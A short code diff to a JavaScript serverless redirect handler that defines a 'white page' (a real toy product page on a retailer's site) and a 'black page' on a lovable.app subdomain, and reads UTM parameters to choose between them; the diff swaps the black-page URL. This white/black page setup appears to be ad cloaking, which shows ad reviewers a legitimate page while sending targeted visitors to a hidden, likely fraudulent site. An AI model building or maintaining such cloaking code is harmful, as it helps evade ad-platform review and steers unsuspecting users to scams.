@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://donebydeer.com/en-dk/collections/activity-toys-for-babies-and-toddlers/products/tiny-farm-play-set-clucky-colour-mix";
-    const blackPageURL = "https://nowherehe.lovable.app/";
+    const blackPageURL = "https://csshhhggot.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
